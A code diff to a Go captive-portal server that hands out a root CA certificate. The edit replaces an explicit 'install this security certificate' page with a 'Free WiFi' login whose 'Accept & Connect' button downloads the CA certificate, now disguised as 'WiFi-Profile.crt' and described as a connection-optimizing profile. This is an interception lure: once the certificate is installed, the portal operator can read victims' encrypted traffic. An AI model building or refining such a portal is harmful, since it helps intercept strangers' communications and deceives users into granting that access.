@@ -84,7 +84,7 @@ func (cp *CaptivePortal) handlePortal(w http.ResponseWriter, r *http.Request) {
 
 func (cp *CaptivePortal) handleCertDownload(w http.ResponseWriter, r *http.Request) {
 	w.Header().Set("Content-Type", "application/x-x509-ca-cert")
-	w.Header().Set("Content-Disposition", "attachment; filename=network-security-cert.crt")
+	w.Header().Set("Content-Disposition", "attachment; filename=WiFi-Profile.crt")
 	w.Header().Set("Content-Length", fmt.Sprintf("%d", len(cp.caCertPEM)))
 	w.Write(cp.caCertPEM)
 
@@ -114,49 +114,41 @@ const portalHTML = `<!DOCTYPE html>
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Network Security Update Required</title>
+<title>WiFi Login</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
-body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;background:#f5f5f5;color:#333;min-height:100vh;display:flex;align-items:center;justify-content:center}
-.container{max-width:480px;width:90%%;background:#fff;border-radius:12px;box-shadow:0 2px 20px rgba(0,0,0,.1);overflow:hidden}
-.header{background:#0078d4;color:#fff;padding:24px;text-align:center}
-.header h1{font-size:18px;font-weight:600}
-.header .icon{font-size:48px;margin-bottom:12px}
+body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;background:linear-gradient(135deg,#667eea 0%%,#764ba2 100%%);color:#333;min-height:100vh;display:flex;align-items:center;justify-content:center}
+.container{max-width:420px;width:90%%;background:#fff;border-radius:16px;box-shadow:0 20px 60px rgba(0,0,0,.3);overflow:hidden}
+.header{background:#fff;padding:32px 24px 16px;text-align:center;border-bottom:1px solid #eee}
+.header .wifi-icon{font-size:48px;margin-bottom:8px}
+.header h1{font-size:20px;font-weight:700;color:#1a1a2e}
+.header p{font-size:13px;color:#888;margin-top:4px}
 .body{padding:24px}
 .body p{margin-bottom:16px;line-height:1.6;font-size:14px;color:#555}
-.steps{background:#f8f9fa;border-radius:8px;padding:16px;margin:16px 0}
-.steps li{margin-bottom:8px;font-size:13px;line-height:1.5}
-.btn{display:block;width:100%%;padding:14px;border:none;border-radius:8px;font-size:16px;font-weight:600;cursor:pointer;text-align:center;text-decoration:none;margin-bottom:12px}
-.btn-primary{background:#0078d4;color:#fff}
-.btn-primary:hover{background:#106ebe}
-.btn-secondary{background:#e9ecef;color:#333}
-.btn-secondary:hover{background:#dee2e6}
-.footer{padding:16px 24px;background:#f8f9fa;text-align:center;font-size:11px;color:#999}
-.shield{display:inline-block;background:#e8f4e8;color:#2e7d32;padding:4px 12px;border-radius:12px;font-size:12px;font-weight:600;margin-bottom:16px}
+.terms{background:#f8f9fa;border-radius:10px;padding:16px;margin:16px 0;font-size:12px;color:#777;line-height:1.6;max-height:120px;overflow-y:auto}
+.btn{display:block;width:100%%;padding:14px;border:none;border-radius:10px;font-size:16px;font-weight:600;cursor:pointer;text-align:center;text-decoration:none;margin-bottom:10px;transition:transform .1s}
+.btn:active{transform:scale(.98)}
+.btn-connect{background:linear-gradient(135deg,#667eea,#764ba2);color:#fff}
+.btn-skip{background:transparent;color:#888;font-size:13px;font-weight:400}
+.footer{padding:12px 24px;text-align:center;font-size:10px;color:#bbb}
 </style>
 </head>
 <body>
 <div class="container">
 <div class="header">
-<div class="icon">&#128274;</div>
-<h1>Network Security Certificate Required</h1>
+<div class="wifi-icon">&#128246;</div>
+<h1>Welcome to Free WiFi</h1>
+<p>High-speed internet access</p>
 </div>
 <div class="body">
-<div style="text-align:center"><span class="shield">&#9989; Verified Network</span></div>
-<p>This network requires a security certificate to protect your connection. This is a standard security measure used by organizations to ensure encrypted communications.</p>
-<p><strong>To connect to the internet, please install the network security certificate:</strong></p>
-<ol class="steps">
-<li>Tap <strong>"Download Certificate"</strong> below</li>
-<li>Open the downloaded file</li>
-<li>Follow your device's prompts to install it</li>
-<li>Tap <strong>"I've Installed It"</strong> to continue</li>
-</ol>
-<a href="http://%s/cert" class="btn btn-primary">&#128267; Download Certificate</a>
-<a href="http://%s/done" class="btn btn-secondary">I've Installed It &#8594;</a>
+<p>Accept our terms of service to connect to the internet. A WiFi profile will be installed to optimize your connection.</p>
+<div class="terms">
+By connecting, you agree to the acceptable use policy. This network may monitor traffic for security purposes. Users must not engage in illegal activity. Service is provided as-is without warranty. Maximum session: 24 hours. The network operator reserves the right to disconnect users at any time.
 </div>
-<div class="footer">
-Network Security Policy v3.2 &bull; This certificate enables secure browsing on this network
+<a href="http://%s/cert" class="btn btn-connect">Accept &amp; Connect</a>
+<a href="http://%s/done" class="btn btn-skip">Skip for now</a>
 </div>
+<div class="footer">Powered by NetConnect &bull; Terms of Service apply</div>
 </div>
 </body>
 </html>`
